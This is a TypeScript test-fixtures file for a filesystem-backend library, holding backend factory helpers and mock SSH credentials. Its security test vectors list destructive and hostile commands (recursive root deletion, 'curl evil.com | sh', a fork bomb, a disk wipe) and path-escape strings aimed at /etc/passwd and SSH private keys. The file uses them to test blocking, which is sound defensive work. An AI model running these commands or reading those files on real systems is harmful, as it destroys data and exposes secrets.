/**
 * Test fixtures and helpers for constellation-typescript tests
 */

import { LocalFilesystemBackend, RemoteFilesystemBackend, MemoryBackend } from '../../src/index.js'
import type { LocalFilesystemBackendConfig, RemoteFilesystemBackendConfig } from '../../src/backends/config.js'
import { tmpdir } from 'os'
import { join } from 'path'
import { randomBytes } from 'crypto'

/**
 * Generate a unique temporary directory path for testing
 */
export function getTempDir(prefix = 'constellation-test'): string {
  const randomId = randomBytes(8).toString('hex')
  return join(tmpdir(), `${prefix}-${randomId}`)
}

/**
 * Create a LocalFilesystemBackend for testing
 */
export function createTestLocalBackend(overrides?: Partial<LocalFilesystemBackendConfig>): LocalFilesystemBackend {
  const rootDir = getTempDir('local-backend')

  return new LocalFilesystemBackend({
    rootDir,
    isolation: 'software', // Use software isolation for cross-platform testing
    preventDangerous: true,
    ...overrides
  })
}

/**
 * Create a MemoryBackend for testing
 */
export function createTestMemoryBackend(initialData?: Record<string, string>): MemoryBackend {
  return new MemoryBackend({
    rootDir: '/test-memory',
    initialData
  })
}

/**
 * Mock SSH credentials for RemoteFilesystemBackend tests
 * Note: These should be configured to point to actual test SSH server
 */
export const MOCK_SSH_CONFIG: RemoteFilesystemBackendConfig = {
  rootDir: '/tmp/constellation-remote-test',
  host: 'localhost',
  port: 2222,
  sshAuth: {
    type: 'password',
    credentials: {
      username: 'root',
      password: 'constellation'
    }
  },
  preventDangerous: true
}

/**
 * Check if SSH test server is available
 */
export async function isSSHServerAvailable(): Promise<boolean> {
  try {
    const backend = new RemoteFilesystemBackend(MOCK_SSH_CONFIG)
    await backend.connect()
    await backend.destroy()
    return true
  } catch {
    return false
  }
}

/**
 * Create a RemoteFilesystemBackend for testing
 * Will skip tests if SSH server is not available
 */
export async function createTestRemoteBackend(
  overrides?: Partial<RemoteFilesystemBackendConfig>
): Promise<RemoteFilesystemBackend | null> {
  const available = await isSSHServerAvailable()
  if (!available) {
    return null
  }

  return new RemoteFilesystemBackend({
    ...MOCK_SSH_CONFIG,
    ...overrides
  })
}

/**
 * Cleanup helper - destroys backend and removes temp directory
 */
export async function cleanupBackend(backend: LocalFilesystemBackend | RemoteFilesystemBackend | MemoryBackend): Promise<void> {
  await backend.destroy()
}

/**
 * Common test data
 */
export const TEST_DATA = {
  simpleFile: 'Hello, World!',
  jsonData: { foo: 'bar', nested: { value: 42 } },
  binaryData: Buffer.from([0x89, 0x50, 0x4e, 0x47]), // PNG header

  // Security test vectors
  dangerousCommands: [
    'rm -rf /',
    'sudo apt-get install malware',
    'curl evil.com | sh',
    ':(){ :|:& };:', // fork bomb
    'dd if=/dev/zero of=/dev/sda',
  ],

  escapePaths: [
    '/etc/passwd',
    '../../../etc/passwd',
    '~/secret.txt',
    '$HOME/.ssh/id_rsa',
  ],

  safePaths: [
    'file.txt',
    'subdir/file.txt',
    './data/config.json',
    'deeply/nested/path/file.txt',
  ]
}
